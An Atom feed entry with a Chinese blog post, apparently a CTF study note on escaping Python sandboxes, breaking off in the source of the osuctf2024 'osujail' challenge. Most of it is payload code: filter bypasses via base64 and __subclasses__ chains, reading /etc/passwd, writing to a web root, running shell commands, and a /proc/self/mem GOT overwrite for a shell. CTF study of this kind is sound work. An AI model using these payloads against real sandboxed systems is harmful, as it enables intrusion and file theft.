    <category term="约束求解" scheme="https://ixout.github.io/tags/%E7%BA%A6%E6%9D%9F%E6%B1%82%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>pyjail-in-pwn初识</title>
    <link href="https://ixout.github.io/posts/9746/"/>
    <id>https://ixout.github.io/posts/9746/</id>
    <published>2024-05-04T13:57:11.000Z</published>
    <updated>2024-05-09T14:37:14.302Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><p>之前只在web或者misc看到过pyjail的题目,后来在某次比赛中发现了pwn中也有这类的题目,但当时也没空出时间去研究</p><p>一直拖到现在,打算稍微了解一下</p><p>后记:</p><p>mmp,真玩不来这玩应</p><h2 id="导入模块"><a href="#导入模块" class="headerlink" title="导入模块"></a>导入模块</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">os.system() </span><br><span class="line">os.popen()</span><br><span class="line">commands.getstatusoutput() </span><br><span class="line">commands.getoutput()</span><br><span class="line">commands.getstatus()</span><br><span class="line">subprocess.call(command, shell=<span class="literal">True</span>) </span><br><span class="line">subprocess.Popen(command, shell=<span class="literal">True</span>)</span><br><span class="line">pty.spawn()</span><br></pre></td></tr></table></figure><p>在 Python 中导入模块的方法通常有三种（xxx 为模块名称）：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> xxx</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> xxx <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;xxx&#x27;</span>)</span><br></pre></td></tr></table></figure><p>import是 Python 中的一个关键字，用于在代码中静态地导入一个模块。</p><p>_<em>import_</em> 是 Python 中的一个内置函数，用于动态地导入模块。它允许在运行时根据需要导入模块，而不是在代码的顶部或其他静态位置</p><p>我们可以通过上述的导入方法，导入相关模块并使用上述的函数实现命令执行。 除此之外，我们也可以<strong>通过路径引入模块</strong>： 如在 linux 系统中 Python 的 os 模块的路径一般都是在 <code>/usr/lib/python2.7/os.py</code>，当知道路径的时候，我们就可以通过如下的操作导入模块，然后进一步使用相关函数。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">&#x27;os&#x27;</span>]=<span class="string">&#x27;/usr/lib/python2.7/os.py&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p><strong>其他的危险函数举例</strong> </p><p>如 <strong>execfile</strong> 文件执行</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>execfile(<span class="string">&#x27;/usr/lib/python2.7/os.py&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>system(<span class="string">&#x27;cat /etc/passwd&#x27;</span>)</span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/<span class="built_in">bin</span>/bash</span><br><span class="line">daemon:x:<span class="number">1</span>:<span class="number">1</span>:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">bin</span>:x:<span class="number">2</span>:<span class="number">2</span>:<span class="built_in">bin</span>:/<span class="built_in">bin</span>:/usr/sbin/nologin</span><br><span class="line">sys:x:<span class="number">3</span>:<span class="number">3</span>:sys:/dev:/usr/sbin/nologin</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getcwd()</span><br><span class="line"><span class="string">&#x27;/usr/lib/python2.7&#x27;</span></span><br></pre></td></tr></table></figure><p>貌似只适用于python2</p><p><strong>timeit</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line">timeit.timeit(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;dir&#x27;)&quot;</span>,number=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><code>timeit</code> 模块是 Python 中用于测试代码执行时间的工具。它允许你在代码中精确地测量执行时间，以便比较不同实现的性能或者优化代码。</p><p><strong>exec</strong> 和 <strong>eval</strong> 比较经典了</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;dir&quot;)&#x27;</span>)</span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;dir&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>platform</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="built_in">print</span> platform.popen(<span class="string">&#x27;dir&#x27;</span>).read()</span><br></pre></td></tr></table></figure><p><code>platform</code> 模块是 Python 中的一个标准库，提供了用于获取平台信息的函数。它允许你在运行 Python 脚本的计算机上查询操作系统、硬件架构和 Python 解释器的相关信息。</p><p>貌似也仅限于python2</p><hr><p>但是，正常的 Python 沙箱会以黑名单的形式禁止使用一些模块如 os 或以白名单的形式只允许用户使用沙箱提供的模块，用以阻止用户的危险操作。而如何进一步逃逸沙箱就是我们的重点研究内容。</p><h2 id="内建函数"><a href="#内建函数" class="headerlink" title="内建函数"></a>内建函数</h2><p>当我们不能导入模块，或者想要导入的模块被禁，那么我们只能寻求 Python 本身内置函数（即通常不用人为导入，Python 本身默认已经导入的函数）。我们可以通过可以通过 <code>dir __builtin__</code> 来获取内置函数列表</p><p><strong>python2</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>(__builtins__)</span><br><span class="line">[<span class="string">&#x27;ArithmeticError&#x27;</span>, <span class="string">&#x27;AssertionError&#x27;</span>, <span class="string">&#x27;AttributeError&#x27;</span>, <span class="string">&#x27;BaseException&#x27;</span>, <span class="string">&#x27;BufferError&#x27;</span>, <span class="string">&#x27;BytesWarning&#x27;</span>, <span class="string">&#x27;DeprecationWarning&#x27;</span>, <span class="string">&#x27;EOFError&#x27;</span>, <span class="string">&#x27;Ellipsis&#x27;</span>, <span class="string">&#x27;EnvironmentError&#x27;</span>, <span class="string">&#x27;Exception&#x27;</span>, <span class="string">&#x27;False&#x27;</span>, <span class="string">&#x27;FloatingPointError&#x27;</span>, <span class="string">&#x27;FutureWarning&#x27;</span>, <span class="string">&#x27;GeneratorExit&#x27;</span>, <span class="string">&#x27;IOError&#x27;</span>, <span class="string">&#x27;ImportError&#x27;</span>, <span class="string">&#x27;ImportWarning&#x27;</span>, <span class="string">&#x27;IndentationError&#x27;</span>, <span class="string">&#x27;IndexError&#x27;</span>, <span class="string">&#x27;KeyError&#x27;</span>, <span class="string">&#x27;KeyboardInterrupt&#x27;</span>, <span class="string">&#x27;LookupError&#x27;</span>, <span class="string">&#x27;MemoryError&#x27;</span>, <span class="string">&#x27;NameError&#x27;</span>, <span class="string">&#x27;None&#x27;</span>, <span class="string">&#x27;NotImplemented&#x27;</span>, <span class="string">&#x27;NotImplementedError&#x27;</span>, <span class="string">&#x27;OSError&#x27;</span>, <span class="string">&#x27;OverflowError&#x27;</span>, <span class="string">&#x27;PendingDeprecationWarning&#x27;</span>, <span class="string">&#x27;ReferenceError&#x27;</span>, <span class="string">&#x27;RuntimeError&#x27;</span>, <span class="string">&#x27;RuntimeWarning&#x27;</span>, <span class="string">&#x27;StandardError&#x27;</span>, <span class="string">&#x27;StopIteration&#x27;</span>, <span class="string">&#x27;SyntaxError&#x27;</span>, <span class="string">&#x27;SyntaxWarning&#x27;</span>, <span class="string">&#x27;SystemError&#x27;</span>, <span class="string">&#x27;SystemExit&#x27;</span>, <span class="string">&#x27;TabError&#x27;</span>, <span class="string">&#x27;True&#x27;</span>, <span class="string">&#x27;TypeError&#x27;</span>, <span class="string">&#x27;UnboundLocalError&#x27;</span>, <span class="string">&#x27;UnicodeDecodeError&#x27;</span>, <span class="string">&#x27;UnicodeEncodeError&#x27;</span>, <span class="string">&#x27;UnicodeError&#x27;</span>, <span class="string">&#x27;UnicodeTranslateError&#x27;</span>, <span class="string">&#x27;UnicodeWarning&#x27;</span>, <span class="string">&#x27;UserWarning&#x27;</span>, <span class="string">&#x27;ValueError&#x27;</span>, <span class="string">&#x27;Warning&#x27;</span>, <span class="string">&#x27;ZeroDivisionError&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;__debug__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;all&#x27;</span>, <span class="string">&#x27;any&#x27;</span>, <span class="string">&#x27;apply&#x27;</span>, <span class="string">&#x27;basestring&#x27;</span>, <span class="string">&#x27;bin&#x27;</span>, <span class="string">&#x27;bool&#x27;</span>, <span class="string">&#x27;buffer&#x27;</span>, <span class="string">&#x27;bytearray&#x27;</span>, <span class="string">&#x27;bytes&#x27;</span>, <span class="string">&#x27;callable&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;classmethod&#x27;</span>, <span class="string">&#x27;cmp&#x27;</span>, <span class="string">&#x27;coerce&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;complex&#x27;</span>, <span class="string">&#x27;copyright&#x27;</span>, <span class="string">&#x27;credits&#x27;</span>, <span class="string">&#x27;delattr&#x27;</span>, <span class="string">&#x27;dict&#x27;</span>, <span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;divmod&#x27;</span>, <span class="string">&#x27;enumerate&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;filter&#x27;</span>, <span class="string">&#x27;float&#x27;</span>, <span class="string">&#x27;format&#x27;</span>, <span class="string">&#x27;frozenset&#x27;</span>, <span class="string">&#x27;getattr&#x27;</span>, <span class="string">&#x27;globals&#x27;</span>, <span class="string">&#x27;hasattr&#x27;</span>, <span class="string">&#x27;hash&#x27;</span>, <span class="string">&#x27;help&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>, <span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;intern&#x27;</span>, <span class="string">&#x27;isinstance&#x27;</span>, <span class="string">&#x27;issubclass&#x27;</span>, <span class="string">&#x27;iter&#x27;</span>, <span class="string">&#x27;len&#x27;</span>, <span class="string">&#x27;license&#x27;</span>, <span class="string">&#x27;list&#x27;</span>, <span class="string">&#x27;locals&#x27;</span>, <span class="string">&#x27;long&#x27;</span>, <span class="string">&#x27;map&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;memoryview&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;next&#x27;</span>, <span class="string">&#x27;object&#x27;</span>, <span class="string">&#x27;oct&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;ord&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;print&#x27;</span>, <span class="string">&#x27;property&#x27;</span>, <span class="string">&#x27;quit&#x27;</span>, <span class="string">&#x27;range&#x27;</span>, <span class="string">&#x27;raw_input&#x27;</span>, <span class="string">&#x27;reduce&#x27;</span>, <span class="string">&#x27;reload&#x27;</span>, <span class="string">&#x27;repr&#x27;</span>, <span class="string">&#x27;reversed&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;set&#x27;</span>, <span class="string">&#x27;setattr&#x27;</span>, <span class="string">&#x27;slice&#x27;</span>, <span class="string">&#x27;sorted&#x27;</span>, <span class="string">&#x27;staticmethod&#x27;</span>, <span class="string">&#x27;str&#x27;</span>, <span class="string">&#x27;sum&#x27;</span>, <span class="string">&#x27;super&#x27;</span>, <span class="string">&#x27;tuple&#x27;</span>, <span class="string">&#x27;type&#x27;</span>, <span class="string">&#x27;unichr&#x27;</span>, <span class="string">&#x27;unicode&#x27;</span>, <span class="string">&#x27;vars&#x27;</span>, <span class="string">&#x27;xrange&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>]</span><br></pre></td></tr></table></figure><p><strong>python3</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>(__builtins__)</span><br><span class="line">[<span class="string">&#x27;ArithmeticError&#x27;</span>, <span class="string">&#x27;AssertionError&#x27;</span>, <span class="string">&#x27;AttributeError&#x27;</span>, <span class="string">&#x27;BaseException&#x27;</span>, <span class="string">&#x27;BlockingIOError&#x27;</span>, <span class="string">&#x27;BrokenPipeError&#x27;</span>, <span class="string">&#x27;BufferError&#x27;</span>, <span class="string">&#x27;BytesWarning&#x27;</span>, <span class="string">&#x27;ChildProcessError&#x27;</span>, <span class="string">&#x27;ConnectionAbortedError&#x27;</span>, <span class="string">&#x27;ConnectionError&#x27;</span>, <span class="string">&#x27;ConnectionRefusedError&#x27;</span>, <span class="string">&#x27;ConnectionResetError&#x27;</span>, <span class="string">&#x27;DeprecationWarning&#x27;</span>, <span class="string">&#x27;EOFError&#x27;</span>, <span class="string">&#x27;Ellipsis&#x27;</span>, <span class="string">&#x27;EnvironmentError&#x27;</span>, <span class="string">&#x27;Exception&#x27;</span>, <span class="string">&#x27;False&#x27;</span>, <span class="string">&#x27;FileExistsError&#x27;</span>, <span class="string">&#x27;FileNotFoundError&#x27;</span>, <span class="string">&#x27;FloatingPointError&#x27;</span>, <span class="string">&#x27;FutureWarning&#x27;</span>, <span class="string">&#x27;GeneratorExit&#x27;</span>, <span class="string">&#x27;IOError&#x27;</span>, <span class="string">&#x27;ImportError&#x27;</span>, <span class="string">&#x27;ImportWarning&#x27;</span>, <span class="string">&#x27;IndentationError&#x27;</span>, <span class="string">&#x27;IndexError&#x27;</span>, <span class="string">&#x27;InterruptedError&#x27;</span>, <span class="string">&#x27;IsADirectoryError&#x27;</span>, <span class="string">&#x27;KeyError&#x27;</span>, <span class="string">&#x27;KeyboardInterrupt&#x27;</span>, <span class="string">&#x27;LookupError&#x27;</span>, <span class="string">&#x27;MemoryError&#x27;</span>, <span class="string">&#x27;ModuleNotFoundError&#x27;</span>, <span class="string">&#x27;NameError&#x27;</span>, <span class="string">&#x27;None&#x27;</span>, <span class="string">&#x27;NotADirectoryError&#x27;</span>, <span class="string">&#x27;NotImplemented&#x27;</span>, <span class="string">&#x27;NotImplementedError&#x27;</span>, <span class="string">&#x27;OSError&#x27;</span>, <span class="string">&#x27;OverflowError&#x27;</span>, <span class="string">&#x27;PendingDeprecationWarning&#x27;</span>, <span class="string">&#x27;PermissionError&#x27;</span>, <span class="string">&#x27;ProcessLookupError&#x27;</span>, <span class="string">&#x27;RecursionError&#x27;</span>, <span class="string">&#x27;ReferenceError&#x27;</span>, <span class="string">&#x27;ResourceWarning&#x27;</span>, <span class="string">&#x27;RuntimeError&#x27;</span>, <span class="string">&#x27;RuntimeWarning&#x27;</span>, <span class="string">&#x27;StopAsyncIteration&#x27;</span>, <span class="string">&#x27;StopIteration&#x27;</span>, <span class="string">&#x27;SyntaxError&#x27;</span>, <span class="string">&#x27;SyntaxWarning&#x27;</span>, <span class="string">&#x27;SystemError&#x27;</span>, <span class="string">&#x27;SystemExit&#x27;</span>, <span class="string">&#x27;TabError&#x27;</span>, <span class="string">&#x27;TimeoutError&#x27;</span>, <span class="string">&#x27;True&#x27;</span>, <span class="string">&#x27;TypeError&#x27;</span>, <span class="string">&#x27;UnboundLocalError&#x27;</span>, <span class="string">&#x27;UnicodeDecodeError&#x27;</span>, <span class="string">&#x27;UnicodeEncodeError&#x27;</span>, <span class="string">&#x27;UnicodeError&#x27;</span>, <span class="string">&#x27;UnicodeTranslateError&#x27;</span>, <span class="string">&#x27;UnicodeWarning&#x27;</span>, <span class="string">&#x27;UserWarning&#x27;</span>, <span class="string">&#x27;ValueError&#x27;</span>, <span class="string">&#x27;Warning&#x27;</span>, <span class="string">&#x27;ZeroDivisionError&#x27;</span>, <span class="string">&#x27;__build_class__&#x27;</span>, <span class="string">&#x27;__debug__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>, <span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;all&#x27;</span>, <span class="string">&#x27;any&#x27;</span>, <span class="string">&#x27;ascii&#x27;</span>, <span class="string">&#x27;bin&#x27;</span>, <span class="string">&#x27;bool&#x27;</span>, <span class="string">&#x27;breakpoint&#x27;</span>, <span class="string">&#x27;bytearray&#x27;</span>, <span class="string">&#x27;bytes&#x27;</span>, <span class="string">&#x27;callable&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;classmethod&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;complex&#x27;</span>, <span class="string">&#x27;copyright&#x27;</span>, <span class="string">&#x27;credits&#x27;</span>, <span class="string">&#x27;delattr&#x27;</span>, <span class="string">&#x27;dict&#x27;</span>, <span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;divmod&#x27;</span>, <span class="string">&#x27;enumerate&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>, <span class="string">&#x27;filter&#x27;</span>, <span class="string">&#x27;float&#x27;</span>, <span class="string">&#x27;format&#x27;</span>, <span class="string">&#x27;frozenset&#x27;</span>, <span class="string">&#x27;getattr&#x27;</span>, <span class="string">&#x27;globals&#x27;</span>, <span class="string">&#x27;hasattr&#x27;</span>, <span class="string">&#x27;hash&#x27;</span>, <span class="string">&#x27;help&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>, <span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;isinstance&#x27;</span>, <span class="string">&#x27;issubclass&#x27;</span>, <span class="string">&#x27;iter&#x27;</span>, <span class="string">&#x27;len&#x27;</span>, <span class="string">&#x27;license&#x27;</span>, <span class="string">&#x27;list&#x27;</span>, <span class="string">&#x27;locals&#x27;</span>, <span class="string">&#x27;map&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;memoryview&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;next&#x27;</span>, <span class="string">&#x27;object&#x27;</span>, <span class="string">&#x27;oct&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;ord&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;print&#x27;</span>, <span class="string">&#x27;property&#x27;</span>, <span class="string">&#x27;quit&#x27;</span>, <span class="string">&#x27;range&#x27;</span>, <span class="string">&#x27;repr&#x27;</span>, <span class="string">&#x27;reversed&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;set&#x27;</span>, <span class="string">&#x27;setattr&#x27;</span>, <span class="string">&#x27;slice&#x27;</span>, <span class="string">&#x27;sorted&#x27;</span>, <span class="string">&#x27;staticmethod&#x27;</span>, <span class="string">&#x27;str&#x27;</span>, <span class="string">&#x27;sum&#x27;</span>, <span class="string">&#x27;super&#x27;</span>, <span class="string">&#x27;tuple&#x27;</span>, <span class="string">&#x27;type&#x27;</span>, <span class="string">&#x27;vars&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>]</span><br></pre></td></tr></table></figure><p>在 Python 中，不引入直接使用的内置函数被成为 <strong>builtin</strong> 函数，随着 <strong>builtin</strong> 这个模块自动引入到环境中。</p><p>那么我们如何引入的模块呢？我们可以通过 <strong>dict</strong> 引入我们想要引入的模块。<strong>dict</strong> 的作用是列出一个模组 / 类 / 对象 下面 所有的属性和函数。这在沙盒逃逸中是很有用的, 可以找到隐藏在其中的一些东西 <strong>dict</strong> 能做什么呢？ </p><p>我们知道，一个模块对象有一个由字典对象实现的命名空间，属性的引用会被转换为这个字典中的查找，例如，<code>m.x</code> 等同于 <code>m.dict[&quot;x&quot;]</code>。</p><p>绕过实例： 首先通过 base64 绕过字符明文检测</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">&#x27;__import__&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;b3M=&#x27;</span></span><br></pre></td></tr></table></figure><p>然后通过 <strong>dict</strong> 引用</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)](<span class="string">&#x27;b3M=&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>))</span><br></pre></td></tr></table></figure><p>如果一些 内敛函数在 <strong>builtins</strong> 删除 ，我们可以通过 reload(<strong>builtins</strong>) 重新载入获取一个完整的 <strong>builtins</strong></p><h2 id="创建对象以及引用"><a href="#创建对象以及引用" class="headerlink" title="创建对象以及引用"></a>创建对象以及引用</h2><p>Python 的 object 类中集成了很多的基础函数，我们想要调用的时候也是可以通过创建对象进而引用。</p><p>我们有常见的两个方法：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>]</span><br></pre></td></tr></table></figure><p> 如，我们可通过 <code>print(().__class__.__bases__[0].__subclasses__()[40](&quot;/etc/services&quot;).read())</code>达到文件读取的效果，</p><p><strong>常见 payload</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#读文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">r&#x27;C:\1.php&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment">#写文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/var/www/html/input&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行任意命令</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27;</span> )</span><br></pre></td></tr></table></figure><h3 id="间接引用"><a href="#间接引用" class="headerlink" title="间接引用"></a>间接引用</h3><p>在有些题目中import 其实整个是被阉割了。但是在 Python 中，原生的 <strong>import</strong> 是存在被引用的，只要我们找到相关对象引用就可以进一步获取我们想要的内容</p><h3 id="write-修改-got-表"><a href="#write-修改-got-表" class="headerlink" title="write 修改 got 表"></a>write 修改 got 表</h3><p>实际上是一个 <strong>/proc/self/mem</strong> 的内存操作方法</p><p> <strong>/proc/self/mem</strong> 是内存镜像，能够通过它来<strong>无视权限</strong>读写到进程的所有内存，包括可执行代码，如果我们能获取到 Python 一些函数的偏移，如 <strong>system</strong> ，我们便可以通过覆写 got 表达到 getshell 的目的。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">lambda</span> r,w:r.seek(<span class="number">0x08de2b8</span>) <span class="keyword">or</span> w.seek(<span class="number">0x08de8c8</span>) <span class="keyword">or</span> w.write(r.read(<span class="number">8</span>)) <span class="keyword">or</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;c&#x27;</span>+<span class="string">&#x27;at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb&#x27;</span>))(().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/proc/self/mem&#x27;</span>,<span class="string">&#x27;r&#x27;</span>),().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/proc/self/mem&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>第一个地址是 system 的偏移，第二个是 fopen 的偏移，我们可以通过 <strong>objdump</strong> 获取相关信息 </p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="osuctf2024-osujail"><a href="#osuctf2024-osujail" class="headerlink" title="osuctf2024-osujail"></a>osuctf2024-osujail</h2><p>这道pyjail题目放在了pwn分类下</p><p>pyjail on python 3.9</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">backup_len = <span class="built_in">len</span></span><br><span class="line">backup_eval = <span class="built_in">eval</span></span><br><span class="line">backup_print = <span class="built_in">print</span></span><br><span class="line">backup_input = <span class="built_in">input</span></span><br><span class="line">backup_all = <span class="built_in">all</span></span><br><span class="line">backup_ord = <span class="built_in">ord</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rescued_osu</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">input</span>.count(<span class="string">&#x27;o&#x27;</span>) == <span class="number">1</span> <span class="keyword">and</span> <span class="built_in">input</span>.count(<span class="string">&#x27;s&#x27;</span>) == <span class="number">1</span> <span class="keyword">and</span> <span class="built_in">input</span>.count(<span class="string">&#x27;u&#x27;</span>) == <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">caught_by_guards</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;[&#x27;</span> <span class="keyword">in</span> <span class="built_in">input</span> <span class="keyword">or</span> <span class="string">&#x27;]&#x27;</span> <span class="keyword">in</span> <span class="built_in">input</span> <span class="keyword">or</span> <span class="string">&#x27;&#123;&#x27;</span> <span class="keyword">in</span> <span class="built_in">input</span> <span class="keyword">or</span> <span class="string">&#x27;&#125;&#x27;</span> <span class="keyword">in</span> <span class="built_in">input</span> <span class="keyword">or</span> <span class="keyword">not</span> backup_all(<span class="number">0</span> &lt;= backup_ord(c) &lt;= <span class="number">255</span> <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">input</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">globals</span>()[<span class="string">&#x27;__builtins__&#x27;</span>].__dict__.clear()</span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span> = backup_input()</span><br><span class="line"><span class="keyword">if</span> caught_by_guards(<span class="built_in">input</span>) <span class="keyword">or</span> <span class="keyword">not</span> rescued_osu(<span class="built_in">input</span>):</span><br><span class="line">    backup_print(<span class="string">&#x27;[You failed to break the jail]&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    